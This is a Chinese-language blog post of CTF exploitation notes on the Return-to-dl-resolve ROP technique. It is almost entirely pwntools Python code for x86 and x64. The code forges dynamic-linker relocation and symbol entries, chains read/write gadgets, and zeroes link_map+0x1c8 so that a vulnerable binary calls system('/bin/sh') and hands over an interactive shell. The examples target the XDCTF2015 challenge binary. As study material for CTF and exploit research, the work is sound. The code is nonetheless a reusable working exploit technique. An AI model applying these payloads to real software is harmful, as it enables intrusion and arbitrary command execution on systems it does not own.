---
layout: post
title: Return-to-dl-resolve笔记
slug: Return-to-dl-resolve
date: 2019-07-17 15:26
status: publish
author: yuri
tags: 
  - pwn
  - ROP
categories:
  - pwn
excerpt: 高级rop技巧 Return-to-dl-resolve。
---

# Return-to-dl-resolve

## `x86`

```Python
from pwn import *
elf = ELF('./bin')

def dl_resolve_data(base_stage, fun_name):
    # base_stage : dl_resolve_data_addr
    # fun_name : str
    # 40 < len(return) <= 50
    strtab = elf.dynamic_value_by_tag('DT_STRTAB') # ".dynstr"
    symtab = elf.dynamic_value_by_tag('DT_SYMTAB') # ".dynsym"
    syment = elf.dynamic_value_by_tag('DT_SYMENT') # 0x10

    fake_sym_addr = base_stage + 0x8
    align = syment - ((fake_sym_addr - symtab) & 0xf)
    fake_sym_addr = fake_sym_addr + align   # fake_sym_addr
    index_dynsym = (fake_sym_addr - symtab) / syment

    st_name = (base_stage + 40) - strtab # fun_name.addr - strtab

    payload  = p32(base_stage) + p32((index_dynsym << 8) | 0x7)
    payload += 'B' * align
    payload += p32(st_name) + p32(0) + p32(0) + p32(0x12)
    payload += 'B' * (40 - len(payload))
    payload += fun_name + "\x00"

    return payload

def dl_resolve_call(data_addr, args_addr):
    # data_addr : dl_resolve_data_addr
    # args_addr : args_addr
    # len(return) == 0x10
    jmprel = elf.dynamic_value_by_tag('DT_JMPREL')

    reloc_offset = data_addr - jmprel

    buf  = p32(elf.get_section_by_name(".plt").header['sh_addr']) # plt_0
    buf += p32(reloc_offset)
    buf += 'AAAA'
    buf += p32(args_addr)

    return buf
```

其中：

* `dl_resolve_data()`：伪造的数据，`fun_name`为调用的函数名("system")
* `dl_resolve_call()`：伪造调用栈，`args_addr`为函数参数地址(addr(“/bin/sh\x00”))
* `dl_resolve_data()`的`base_stage`与`dl_resolve_call()`的`data_addr`应一致，为`dl_resolve_data()`写入数据的起始地址

例子：

```Python
if __name__ == "__main__":
    offset = 112
    read_plt = elf.plt['read']

    ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"

    base_stage = 0x0804a040 # readelf -S bof | grep ".bss"

    r.recvuntil('Welcome to XDCTF2015~!\n')

    resolve_data_addr = base_stage + 0x10
    func_name = "system"
    Args = "/bin/sh"
    args_addr = base_stage

    payload  = 'A' * offset
    payload += p32(read_plt)
    payload += p32(ppp_ret)
    payload += p32(0)
    payload += p32(base_stage)
    payload += p32(100)
    payload += dl_resolve_call(resolve_data_addr, args_addr)
    r.sendline(payload)

    payload2 = Args.ljust(0x10,"\x00")
    payload2 += dl_resolve_data(resolve_data_addr, func_name)

    r.sendline(payload2)

    r.interactive()
```

## `x64`

大部分基本一致，只是参数要通过`pop_rdi`传递：

```Python
from pwn import *
elf = ELF('./bin')

def Align(addr, origin, size):
    padlen = size - ((addr-origin) % size)
    return (addr+padlen, padlen)

def dl_resolve_data(base_stage, fun_name):
    # base_stage : dl_resolve_data_addr
    # fun_name : str

    strtab = elf.dynamic_value_by_tag('DT_STRTAB') # ".dynstr"
    symtab = elf.dynamic_value_by_tag('DT_SYMTAB') # ".dynsym"
    syment = elf.dynamic_value_by_tag('DT_SYMENT')
    relaent = elf.dynamic_value_by_tag('DT_RELAENT')
    jmprel = elf.dynamic_value_by_tag('DT_JMPREL')

    addr_reloc, padlen_reloc = Align(base_stage, jmprel, relaent)
    addr_sym, padlen_sym = Align(addr_reloc+relaent, symtab, syment)

    addr_symstr = addr_sym + syment

    r_info = (((addr_sym - symtab) / syment) << 0x20) | 0x7
    st_name = addr_symstr - strtab

    payload  = 'A' * padlen_reloc
    payload += p64(base_stage) + p64(r_info) + p64(0)
    payload += 'B' * padlen_sym
    payload += p32(st_name) + p32(0x12) + p64(0) + p64(0)
    payload += fun_name + "\x00"

    return payload

def dl_resolve_call(data_addr):
    # data_addr : dl_resolve_data_addr
    # len(return) == 0x10
    jmprel = elf.dynamic_value_by_tag('DT_JMPREL')
    relaent = elf.dynamic_value_by_tag('DT_RELAENT')

    addr_reloc, padlen_reloc = Align(data_addr, jmprel, relaent)
    reloc_offset = (addr_reloc - jmprel) / relaent

    buf  = p64(elf.get_section_by_name(".plt").header['sh_addr']) # plt_0
    buf += p64(reloc_offset)

    return buf
```

但是`link_map+0x1c8`要置`0`，例子如下：

```Python
def call64(call_got,arg1,arg2,arg3,ret):
    payload  = p64(0x40064A) +p64(0) + p64(1)
    payload += p64(call_got) + p64(arg3) + p64(arg2) + p64(arg1)
    payload += p64(0x400630)
    payload += "a"*56
    payload += p64(ret)
    return payload

if __name__ == "__main__":
    offset = 0x20 + 8
    read_plt = elf.plt['read']
    write_plt = elf.plt['write']
    read_got = elf.got['read']
    write_got = elf.got['write']

    base_stage = 0x601040 + 0x400 # readelf -S bof | grep ".bss"
    got_0 = elf.dynamic_value_by_tag('DT_PLTGOT')
    vuln_addr = 0x40059F
    pop_rdi_ret = 0x400653
    leave_ret = 0x04006ab

    r.recvuntil('flag\n')
    r.recv(100)
    payload  = 'A' * offset
    payload += call64(write_got,1,got_0+8,8, vuln_addr)
    r.sendline(payload)
    addr_dt_debug = u64(r.recv(8)) + 0x1c8
    print hex(addr_dt_debug)

    sleep(0.1)

    payload  = 'A' * offset
    payload += call64(read_got,0,addr_dt_debug,8, vuln_addr)
    r.sendline(payload)

    sleep(0.1)
    r.send(p64(0))
    sleep(0.1)

    resolve_data_addr = base_stage + 0x10
    func_name = "system"
    Args = "/bin/sh"

    payload  = 'A' * offset
    payload += call64(read_got,0,base_stage,256, vuln_addr)

    r.sendline(payload)

    payload  = Args.ljust(0x10,"\x00")
    payload += dl_resolve_data(resolve_data_addr, func_name)

    r.sendline(payload)

    payload  = 'A' * offset
    payload += p64(pop_rdi_ret)
    payload += p64(base_stage)
    payload += dl_resolve_call(resolve_data_addr)

    r.sendline(payload)

    r.interactive()
```
